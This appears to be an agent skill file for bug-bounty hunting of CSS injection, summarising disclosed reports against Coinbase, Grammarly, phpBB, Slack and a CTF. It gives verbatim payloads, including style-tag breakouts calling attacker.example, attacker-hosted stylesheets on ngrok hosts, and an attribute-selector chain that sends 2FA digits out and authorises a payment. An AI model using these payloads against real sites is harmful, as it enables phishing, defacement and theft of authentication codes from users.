---
name: hunter-l3-css-injection
description: "Use when hunting CSS Injection on a target. Loads the L3 technique sheet: CSS Injection is the ability to get attacker-controlled style rules, stylesheets, or style attribute content applied to a victim page."
domain: cybersecurity
subdomain: web
tags:
- web
- css-injection
- hunting
- l3
version: '1.0'
---

# CSS Injection — Technique Sheet

## Overview

CSS Injection is the ability to get attacker-controlled style rules, stylesheets, or style attribute content applied to a victim page. It is frequently dismissed as low-severity, but the records show three escalating payoff tiers: (1) arbitrary element placement / UI redressing (overlay attacks) via `position:fixed`; (2) full-page takeover/persistence by injecting whole new rule blocks (`} html {display:none;}`) or breakouts from `<style>` tags; and (3) data exfiltration via CSS attribute selectors (`input[name=code_N][value^=x]` with background-image callbacks), which can leak character-by-character sensitive input values such as 2FA codes. It pays wherever a parameter is named like a style/color/URL (e.g. `logo_url`, `extcss`, `app_style`, theme colors, BBcode `[color=]`) and flows into a stylesheet or style attribute with insufficient validation.

## Distinct sub-patterns

### 1. Breakout of a `<style>` tag via unescaped `logo_url` (stored)

- Endpoint/param: `POST /{product}` (Coinbase), param `logo_url`.
- Payload (verbatim):
  ```
  "></style><style>body{background:url("https://attacker.example/steal")}</style>
  ```
- Root cause: `logo_url` was written into a style tag without proper escaping, so `">` closed the tag early and a new `<style>` block was opened under attacker control.
- Impact: Stored CSS injection into the style tag (arbitrary style rules on the product page). Note the report states the equivalent XSS was blocked by CSP — the CSS injection itself still landed.
- Exemplar: 315865 (Coinbase).

### 2. Attacker-supplied external stylesheet via URL parameter (`extcss`)

- Endpoint/param: `GET https://www.grammarly.com/embedded?height=300&extcss=...`, param `extcss`.
- Payload (verbatim):
  ```
  https://www.grammarly.com/embedded?height=300&extcss=https://www.dl.dropboxusercontent.com/s/e0g51ibqswh0v7d/xss.css?dl=0
  ```
- Root cause: `addExternalCss` appends a stylesheet link from the `extcss` parameter without origin checking or filtering — any URL becomes a page stylesheet.
- Impact: External CSS can visually spoof the page for phishing; on older browsers the attacker can also execute JavaScript through the stylesheet host.
- Exemplar: 500436 (Grammarly/Superhuman).
- Note: use of a `dl.dropboxusercontent.com` URL means the report does not include the CSS body — treat the payload's CSS content as "payload not stated"; the injection point and primitive are what's confirmed.

### 3. BBcode `[color=]` → arbitrary CSS in style attribute (UI redressing)

- Endpoint/param: `POST /post` (phpBB), BBcode tag param (redacted in source, the `[color=...]` tag).
- Payload (verbatim):
  ```
  [color=position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;]x[/color]
  ```
- Root cause: the BBcode tag value is converted into a CSS `style` attribute with no filtering beyond quote removal, so arbitrary CSS declarations — including `position:fixed` — pass through.
- Impact: Confirmed arbitrary element placement across the page (e.g. a fixed-position skull pinned at the top of the viewport), enabling UI redressing.
- Exemplar: 587727 (phpBB).
- Practical note: `top:0;left:0;width:100%;height:100%;z-index:999999;` makes the injected element a full-viewport overlay — the classic shape for clickjacking-style redress or defacement.

### 4. Color/theme field injected raw into CSS → injected rule block (persistent)

- Endpoint/param: Slack custom theme "column BG" color field.
- Payload (verbatim):
  ```
  #FFFFFF;} html {display:none;}
  ```
- Root cause: the color value is interpolated directly into a CSS block without validation (no color-format check), so `}` closes the legitimate rule and a new rule (`html {display:none;}`) is injected.
- Impact: completely disabled Slack's app rendering, and the setting **persisted across reinstalls** (stored client-side, surviving uninstall/reinstall). Message-data exfiltration via CSS was hypothesized but NOT proven.
- Exemplar: 679969 (Slack).
- Practical note: the `VALUE;}` breakout works against any config value that is pasted inside a `{...}` rule rather than quoted — always try `}` first on color/theme inputs.

### 5. `app_style` URL parameter + CSS attribute-selector exfiltration of 2FA codes (exfiltration chain)

- Endpoint/param: `POST /pay/{num}/{hash}` (and `/pay/{num}/{uuid}`), param `app_style`.
- Payloads (verbatim, three variants):
  ```
  app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
  app_style=https://babe22004931.ngrok.io/testfinal.css
  app_style=https://foo.x.0xcc.ovh/test.css
  ```
  (Note the first variant reuses a same-site `h1ctf.com` CSS path — useful for confirming the parameter is live before pivoting to your own host.)
- Root cause: the 2FA page loads a user-supplied CSS URL, and each 2FA digit is its own input (`code_1` … `code_7`). CSS attribute selectors of the form `input[name=code_N][value^=x] { background: url(https://attacker/?c=x) }` leak each character to the attacker server.
- Impact: extracted 6 of 7 characters of the 2FA code out-of-band via attribute selectors; brute-forced the final character with Burp Intruder; completed the payment. One variant captured the full 7-char code `ax9lBCt` out-of-band and then authorized the pending payment.
- Chain (as reported):
  1. Replace `app_style` with attacker-hosted CSS; confirm the CSS is fetched (callback hit).
  2. Exfiltrate `code_1`..`code_6` (or all 7) via `input[name=code_N][value^=x]` background-image callbacks.
  3. Brute-force the final character via Burp Intruder.
  4. Submit the 2FA code and process the payment.
- Exemplars: 889293, 889333 (both h1-ctf / BountyPay; two ngrok/own-domain variants listed under 889333).

## Bypass / chain notes

- Quote-stripping is not CSS sanitization: the phpBB filter stripped quotes but still allowed declarations like `position:fixed` inside `[color=...]`. When only quotes are filtered, everything else passes.
- `}` breakout: where the value is interpolated inside a rule block (`#FFFFFF;} html {display:none;}`), a single `}` escapes the block and full rule injection follows. Persistence here came from the setting being stored, so it survived reinstalls.
- CSP does not neutralize CSS injection: record 315865 explicitly notes XSS was blocked by CSP while the stored style-tag injection still succeeded. Don't stop at "CSP blocks it" — style-tag and style-attribute injection remain live primitives.
- Attribute-selector exfiltration is character-by-character and prefix-based (`value^=x`): six characters came out-of-band and the seventh was brute-forced with Burp Intruder rather than recovered via CSS. Plan for the final character(s) to need brute-forcing.
- Mixed-host confirmation trick: point the URL param at a same-origin `.css` file first (the `uni_2fa_style.css` variant) to confirm the parameter is actually fetched, then swap in your own host (ngrok / own domain).
- Prerequisite chains seen: in 889333 the attacker was already logged in as the CEO with leaked credentials before pointing `app_style` at the attacker server — CSS exfil was the final link in a multi-step chain.
- External stylesheet injection (sub-pattern 2) chained to phishing: external CSS can reshape the page for credential spoofing, with JS execution only on older browsers.

## Gotchas / what NOT to do

- Don't claim XSS from CSS injection. Where JS execution was possible it was limited to "older browsers" (record 500436); on modern/CSP'd pages, prove the CSS-only impact (overlay, spoofing, exfiltration) instead.
- Don't assume exfiltration works everywhere — in the Slack case (679969) data exfiltration via CSS was only hypothesized, not proven, and the accepted finding was rendering sabotage + persistence. State what you actually proved.
- Don't forget that attribute-selector exfil needs per-character inputs (`input[name=code_N]`). If the 2FA code is a single input, the `value^=` prefix technique as shown does not apply.
- The Dropbox-hosted CSS (record 500436) shows payload content may not be in the record — don't fabricate a stylesheet body; reproduce the injection point and demonstrate with your own CSS.
- Persistence claims need evidence: the Slack payload surviving reinstalls was a key severity driver; verify storage location if you want the same argument.
- URL-encoded vs plain forms of the same param both fired (record 889293 used percent-encoding, 889333 used plain) — try both encodings.

## Real-world impact examples

- Full 7-character 2FA code exfiltrated out-of-band (`ax9lBCt`) from a payment-confirmation page via CSS attribute selectors, then the pending payment was authorized (889333). In the sibling variant, 6/7 characters were leaked via CSS and the last brute-forced with Intruder, leading to payment completion and CTF flag retrieval (889293).
- Slack client rendering fully disabled by a single theme "color" value (`#FFFFFF;} html {display:none;}`), persisting across app reinstalls (679969).
- Arbitrary fixed-position element overlay across a phpBB page via BBcode color injection — full-viewport UI redress confirmed visually (587727).
- Attacker CSS loaded into a Grammarly embedded page from any URL via `extcss`, enabling page spoofing for phishing and legacy-browser JS execution (500436).
- Stored style-tag injection on a Coinbase product page via `logo_url`, with attacker `background:url(...)` rules live on the page (315865).